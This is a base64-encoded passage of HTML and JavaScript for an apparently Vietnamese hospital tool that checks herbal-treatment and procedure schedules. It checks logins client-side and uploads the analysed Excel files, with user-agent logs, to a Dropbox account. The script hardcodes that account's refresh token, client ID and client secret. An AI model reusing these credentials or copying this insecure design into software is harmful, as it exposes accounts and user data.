WJsZSBoZXJiLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5LaHVuZyBnaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5LaHVuZyBnaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCg0KDQoNCg0KPCEtLSBOw5pUIEhJ4buCTiBUSOG7iiBUSOG7piBUSFXhuqxUIFPhuq5DIFRIVeG7kEMgLS0+DQoNCg0KICANCjwhLS0gQuG6ok5HIFRI4bumIFRIVeG6rFQgU+G6rkMgVEhV4buQQyBUSEFORyAtLT4NCjxkaXYgaWQ9ImhlcmJQcm9jZWR1cmVUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi10b3A6IDIwcHg7Ij4NCiAgPGRpdiBjbGFzcz0ibWFpbmJsb2sic3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij4NCiAgICA8ZGl2Pg0KICAgIDxzZWxlY3QgaWQ9ImhlcmJEb2N0b3JGaWx0ZXIiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87IG1hcmdpbi1sZWZ0OiAyMHB4OyI+DQogICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICA8c2VsZWN0IGlkPSJoZXJiRGF0ZUZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsiPjwvc2VsZWN0Pg0KICA8L2Rpdj48L2Rpdj4NCg0KPCEtLSBUw5NNIFThuq5UIE9VVExJRVIgLS0+DQo8ZGl2IGlkPSJoZXJiT3V0bGllclN1bW1hcnkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7bWFyZ2luOjhweCAyMHB4O2ZvbnQtc2l6ZToxNHB4Ij4NCiAgPCEtLSBu4buZaSBkdW5nIHPhur0gxJHGsOG7o2MgSlMgY+G6rXAgbmjhuq10IC0tPg0KPC9kaXY+DQogIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPkjhu40gdMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICA8dGg+VGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImhlcmJUYWJsZUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCg0KDQo8IS0tIFBPUFVQIERBTkggU8OBQ0ggT1VUTElFUiBT4bquQyBUSFXhu5BDIFRIQU5HIC0tPg0KPGRpdiBpZD0iaGVyYk91dGxpZXJNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwMDAiPg0KICA8ZGl2IGlkPSJoZXJiT3V0bGllckJhY2tkcm9wIiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSI+PC9kaXY+DQogIDxkaXYgcm9sZT0iZGlhbG9nIiBhcmlhLW1vZGFsPSJ0cnVlIg0KICAgICAgIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MTAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpOw0KICAgICAgICAgICAgICBtYXgtd2lkdGg6NzAwcHg7bWF4LWhlaWdodDo4MHZoO292ZXJmbG93OmF1dG87DQogICAgICAgICAgICAgIGJhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO3BhZGRpbmc6MjBweDtib3JkZXItcmFkaXVzOjhweDsNCiAgICAgICAgICAgICAgYm9yZGVyOjJweCBzb2xpZCAjZDMyZjJmO2JveC1zaGFkb3c6MCA1cHggMjBweCByZ2JhKDAsMCwwLDAuMyk7Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZiI+DQogICAgPGgzPkRhbmggc8OhY2ggY2Ega2jDoWMgxJFhIHPhu5E8L2gzPg0KICAgIDxkaXYgc3R5bGU9Im1hcmdpbjoxMHB4IDA7Zm9udC1zaXplOjEzcHgiIGlkPSJoZXJiT3V0bGllck1vZGFsSW5mbyI+PC9kaXY+DQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSIgc3R5bGU9Im1hcmdpbi10b3A6MTBweCI+DQogICAgICA8dGhlYWQ+DQogICAgICAgIDx0cj4NCiAgICAgICAgICA8dGg+SOG7jSB0w6puIGLhu4duaCBuaMOibjwvdGg+DQogICAgICAgICAgPHRoPlRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgIDwvdHI+DQogICAgICA8L3RoZWFkPg0KICAgICAgPHRib2R5IGlkPSJoZXJiT3V0bGllck1vZGFsQm9keSI+PC90Ym9keT4NCiAgICA8L3RhYmxlPg0KICAgIDxici8+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiB0eXBlPSJidXR0b24iIGlkPSJoZXJiT3V0bGllckNsb3NlQnRuIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KDQoNCjxici8+DQo8YnIvPjxkaXYgaWQ9ImVycm9yU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCjxici8+DQo8aDMgaWQ9ImVycm9yU2VjdGlvblRpdGxlIj5M4buXaSBOaOG6rXAgU2FpIFRo4budaSBHaWFuPC9oMz4NCjxkaXYgaWQ9Im9wZXJhdG9yRmlsdGVyRXJyb3IiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQo8bGFiZWwgZm9yPSJvcGVyYXRvclNlbGVjdEVycm9yIj5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCjxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ib3BlcmF0b3JTZWxlY3RFcnJvciI+DQo8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCjwvc2VsZWN0Pg0KPC9kaXY+DQo8ZGl2IGlkPSJlcnJvckxvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQoNCjxkaXYgaWQ9InJlc3VsdFNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQo8aDMgaWQ9InJlc3VsdFNlY3Rpb25UaXRsZSI+VHLDuW5nIEdp4budPC9oMz4gDQoNCjxkaXYgaWQ9Im9wZXJhdG9yRmlsdGVyIiBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZGlzcGxheTogbm9uZTsiPg0KPGxhYmVsIGZvcj0ib3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJvcGVyYXRvclNlbGVjdCI+DQo8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCjwvc2VsZWN0Pg0KPC9kaXY+PGJyLz4NCg0KPHRhYmxlIGlkPSJyZXN1bHRUYWJsZSI+DQo8dGhlYWQ+DQo8dHI+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2FsZW5kYXItYWx0IGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8OgeTwvdGg+DQo8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gR+G7o2kgw70gZ2nhu508L3RoPg0KPC90cj4NCjwvdGhlYWQ+DQo8dGJvZHkgaWQ9InJlc3VsdEJvZHkiPjwvdGJvZHk+DQo8L3RhYmxlPg0KDQoNCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQovLyBU4bqjaSBYTFNYIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlWExTWCgpIHsNCiAgaWYgKCF3aW5kb3cuWExTWCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMveGxzeC8wLjE4LjUveGxzeC5mdWxsLm1pbi5qcycpOw0KICB9DQp9DQoNCi8vIFThuqNpIERyb3Bib3ggU0RLIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlRHJvcGJveCgpIHsNCiAgaWYgKCF3aW5kb3cuRHJvcGJveCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly91bnBrZy5jb20vZHJvcGJveC9kaXN0L0Ryb3Bib3gtc2RrLm1pbi5qcycpOw0KICB9DQp9DQoNCg0KICAgICAgICAvLyBEYW5oIHPDoWNoIHRo4bunIHRodeG6rXQNCiAgICAgICBsZXQgUFJPQ0VEVVJFUyA9IHt9Ow0KDQphc3luYyBmdW5jdGlvbiBsb2FkUHJvY2VkdXJlcygpIHsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2NoYXVfdGh1dGh1YXQudHh0Jyk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBQUk9DRURVUkVTID0gSlNPTi5wYXJzZSh0ZXh0KTsNCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgYWxlcnQoJ0tow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIHRo4bunIHRodeG6rXQ6ICcgKyBlcnIubWVzc2FnZSk7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoZXJyKTsNCiAgICB9DQp9DQoNCgkJDQoNCiAgICAgICAgLy8gQmnhur9uIHRvw6BuIGPhu6VjDQogICAgICAgIGxldCBlcnJvckxvZyA9IFtdOw0KICAgICAgICBsZXQgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICBsZXQgYWxsUHJvY2VkdXJlcyA9IFtdOw0KDQoNCmNvbnN0IERST1BCT1hfQ09ORklHID0gew0KICAgIHJlZnJlc2hUb2tlbjogImN0Z0J2ajNJc3RjQUFBQUFBQUFBQVZGQ3NJWEl1el9DVFFwSW1ha2NDNGN1UVY4RHVta2ZnRFdJczhWR1B2RlQiLA0KICAgIGNsaWVudElkOiAidzhhd2oycXhvM2FpdjVlIiwNCiAgICBjbGllbnRTZWNyZXQ6ICJxa3FvMXU3YXRzN2JsOWciDQp9Ow0KDQphc3luYyBmdW5jdGlvbiBnZXRBY2Nlc3NUb2tlbigpIHsNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCJodHRwczovL2FwaS5kcm9wYm94YXBpLmNvbS9vYXV0aDIvdG9rZW4iLCB7DQogICAgICAgIG1ldGhvZDogIlBPU1QiLA0KICAgICAgICBoZWFkZXJzOiB7DQogICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6ICJCYXNpYyAiICsgYnRvYShgJHtEUk9QQk9YX0NPTkZJRy5jbGllbnRJZH06JHtEUk9QQk9YX0NPTkZJRy5jbGllbnRTZWNyZXR9YCksDQogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCINCiAgICAgICAgfSwNCiAgICAgICAgYm9keTogYGdyYW50X3R5cGU9cmVmcmVzaF90b2tlbiZyZWZyZXNoX3Rva2VuPSR7RFJPUEJPWF9DT05GSUcucmVmcmVzaFRva2VufWANCiAgICB9KTsNCiAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOw0KICAgIHJldHVybiBkYXRhLmFjY2Vzc190b2tlbjsNCn0NCi8vIFThuqNpIFhMU1ggY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVYTFNYKCkgew0KICBpZiAoIXdpbmRvdy5YTFNYKSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy94bHN4LzAuMTguNS94bHN4LmZ1bGwubWluLmpzJyk7DQogIH0NCn0NCg0KLy8gVOG6o2kgRHJvcGJveCBTREsgY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVEcm9wYm94KCkgew0KICBpZiAoIXdpbmRvdy5Ecm9wYm94KSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL3VucGtnLmNvbS9kcm9wYm94L2Rpc3QvRHJvcGJveC1zZGsubWluLmpzJyk7DQogIH0NCn0NCmFzeW5jIGZ1bmN0aW9uIHVwbG9hZFRvRHJvcGJveChmaWxlLCBraG9hVmFsdWUsIG5nYXlWYWx1ZSwgc3RhdHMgPSB7IGhlcmI6IDAsIHRpbWU6IDAsIGNvbmZsaWN0OiAwIH0pIHsNCiAgYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQogICAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICAgIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCg0KICAgIGNvbnN0IHBjTmFtZSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7DQogICAgY29uc3Qgbm93ID0gbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygndmktVk4nKTsNCiAgICBjb25zdCBmaWxlbmFtZSA9IGAke2ZpbGUubmFtZS5yZXBsYWNlKC9cLlteLy5dKyQvLCAiIil9XyR7RGF0ZS5ub3coKX0ueGxzeGA7DQoNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgICAgIHBhdGg6IGAvdGh1dGh1YXQvJHtmaWxlbmFtZX1gLA0KICAgICAgICBjb250ZW50czogZmlsZSwNCiAgICAgICAgbW9kZTogJ2FkZCcsDQogICAgICAgIGF1dG9yZW5hbWU6IHRydWUNCiAgICB9KTsNCg0KICAgIC8vIEdoaSBtZXRhZGF0YSB2w6BvIGZpbGUgSlNPTiB0cnVuZyB0w6JtIChk4bqhbmcgdGV4dCBhcHBlbmQpDQogICAgY29uc3QgbWV0YWRhdGEgPSB7DQogICAgICAgIHN0dDogRGF0ZS5ub3coKSwNCiAgICBraG9hOiBraG9hVmFsdWUsICAgICAgICAvLyDinIUgxJHDum5nIGJp4bq/bg0KICAgIG5nYXk6IG5nYXlWYWx1ZSwgICAgLy8g4pyFIMSRw7puZyBiaeG6v24NCiAgICAgICAgbGluazogImh0dHBzOi8vd3d3LmRyb3Bib3guY29tL2hvbWUvdGh1dGh1YXQ/cHJldmlldz0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGZpbGVuYW1lKSwNCiAgICAgICAgcGM6IHBjTmFtZSwNCiAgICAgICAgdGltZTogbm93LA0KCQloZXJiX2Vycm9yczogTnVtYmVyKHN0YXRzLmhlcmIpIHx8IDAsDQogICAgdGltZV9lcnJvcnM6IE51bWJlcihzdGF0cy50aW1lKSB8fCAwLA0KICAgY29uZmxpY3RfZXJyb3JzOiBOdW1iZXIoc3RhdHMuY29uZmxpY3QpIHx8IDANCiAgICB9Ow0KDQogICAgYXdhaXQgYXBwZW5kRHJvcGJveExvZyhtZXRhZGF0YSk7DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIGFwcGVuZERyb3Bib3hMb2cobG9nSXRlbSkgew0KICAgIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQoNCiAgICBjb25zdCBsb2dQYXRoID0gJy90aHV0aHVhdC9sb2cuanNvbic7DQogICAgbGV0IGxvZ3MgPSBbXTsNCg0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgICAgICBjb25zdCBibG9iID0gcmVzcG9uc2UucmVzdWx0LmZpbGVCbG9iOyAvLyDinIUgZMO5bmcgLnJlc3VsdC5maWxlQmxvYg0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgYmxvYi50ZXh0KCk7DQogICAgICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS53YXJuKCJLaMO0bmcgdMOsbSB0aOG6pXkgbG9nLmpzb24gY8WpIGhv4bq3YyBs4buXaSDEkeG7jWM6IiwgZSk7DQogICAgICAgIGxvZ3MgPSBbXTsNCiAgICB9DQoNCiAgICAvLyBDaMOobiBt4bubaSBuaOG6pXQgbMOqbiDEkeG6p3UNCiAgICBsb2dzLnVuc2hpZnQobG9nSXRlbSk7DQoNCiAgICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgICAgICBwYXRoOiBsb2dQYXRoLA0KICAgICAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LCAvLyDinIUgR2hpIMSRw6ggYuG6r3QgYnXhu5ljDQogICAgICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogICAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gaW5pdEFmdGVyTG9naW4oKSB7DQogIGF3YWl0IFByb21pc2UuYWxsKFsNCiAgICBsb2FkUHJvY2VkdXJlcygpLA0KICAgIGxvYWRDb25mbGljdFJ1bGVzKCkNCiAgXSk7DQp9DQoNCg0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIMSQxIJORyBOSOG6rFAgPT09PT09PT09PSAvLw0KYXN5bmMgZnVuY3Rpb24gY2hlY2tTYXZlZExvZ2luKCkgew0KICAgIGNvbnN0IHNhdmVkVXNlciA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKTsNCiAgICBpZiAoc2F2ZWRVc2VyKSB7DQogICAgICAgIGN1cnJlbnRVc2VyID0gc2F2ZWRVc2VyOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGluaXRBZnRlckxvZ2luKCk7IC8vIGF1dG8tbG9naW4gbeG7m2kgbG9hZCBk4buvIGxp4buHdQ0KICAgIH0NCn0NCg0KbGV0IGlzTG9naW5BY3Rpb24gPSBmYWxzZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmxldCBhbmFseXplUG9wdXBUaW1lcjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmFzeW5jIGZ1bmN0aW9uIGNoZWNrTG9naW4oKSB7DQogIGNvbnN0IGJ0bkxvZ2luICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKTsNCiAgY29uc3QgdXNlcm5hbWUgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUudHJpbSgpOw0KICBjb25zdCBwYXNzd29yZCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZS50cmltKCk7DQogIGNvbnN0IGxvZ2luRXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpOw0KDQogIGJ0bkxvZ2luLmRpc2FibGVkID0gdHJ1ZTsNCiAgYnRuTG9naW4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIMSRxINuZyBuaOG6rXAuLi4nOw0KDQogIGNvbnN0IHBvcHVwICAgICAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogIGxldCBsb2dpblBvcHVwU2hvd24gPSBmYWxzZTsNCg0KICAvLyBTYXUgMnMga2nhu4NtIHRyYTogduG6q24g4bufIHRyYW5nIMSRxINuZyBuaOG6rXAgJiDEkWFuZyBsb2FkaW5nPw0KY29uc3Qgc2xvd0xvZ2luVGltZXIgPSBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICBpZiAoIWlzTG9naW5BY3Rpb24pIHJldHVybjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjb25zdCBsb2dpblNlY3Rpb25WaXNpYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBjb25zdCBzdGlsbExvYWRpbmcgPSBidG5Mb2dpbi5pbm5lckhUTUwuaW5jbHVkZXMoJ8SQYW5nIMSRxINuZyBuaOG6rXAnKTsNCiAgICBpZiAobG9naW5TZWN0aW9uVmlzaWJsZSAmJiBzdGlsbExvYWRpbmcpIHsNCiAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBmYS1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgIGA7DQogICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQogICAgICBsb2dpblBvcHVwU2hvd24gPSB0cnVlOw0KICAgIGxldCBwZXJjZW50ID0gMDsNCnByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KY29uc3QgcHJvZ3Jlc3NUaW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICBwZXJjZW50ICs9IDI7IC8vIHTEg25nIG3hu5dpIGzhuqduIDIlDQogICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgcGVyY2VudCA9IDEwMDsNCiAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICB9DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBwZXJjZW50ICsgJyUnOw0KfSwgNTAwKTsgLy8gMTAwbXMgY+G6rXAgbmjhuq10IDEgbOG6p24NCg0KCQ0KCX0NCiAgfSwgMjAwMCk7DQoNCiAgdHJ5IHsNCiAgICBjb25zdCBhY2NvdW50cyA9IGF3YWl0IGxvYWRBY2NvdW50c0Zyb21UWFQoKTsNCiAgICBpZiAoYWNjb3VudHNbdXNlcm5hbWVdICYmIGFjY291bnRzW3VzZXJuYW1lXSA9PT0gcGFzc3dvcmQpIHsNCiAgICAgIGN1cnJlbnRVc2VyID0gdXNlcm5hbWU7DQogICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcm5hbWUpOw0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KDQogICAgICBhd2FpdCBpbml0QWZ0ZXJMb2dpbigpOyAvLyBjaOG7iSBsb2FkIHNhdSBraGkgbG9naW4gdGjDoG5oIGPDtG5nDQogICAgfSBlbHNlIHsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHEg25nIG5o4bqtcDonLCBlcnIpOw0KICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0gZmluYWxseSB7DQogICAgY2xlYXJUaW1lb3V0KHNsb3dMb2dpblRpbWVyKTsNCg0KICAgIC8vIE7hur91IHBvcHVwIGRvIGxvZ2luIG3hu58gdGjDrCDEkcOzbmcNCiAgICBpZiAobG9naW5Qb3B1cFNob3duICYmIHBvcHVwKSB7DQogICAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgfSwgNDAwKTsNCiAgICB9DQoNCiAgICBidG5Mb2dpbi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgIGJ0bkxvZ2luLmlubmVySFRNTCA9ICfEkMSDbmcgbmjhuq1wJzsNCiAgfQ0KfQ0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nb3V0KCkgew0KICAgICAgICAgICAgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbSgnbWVkVXNlcicpOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50L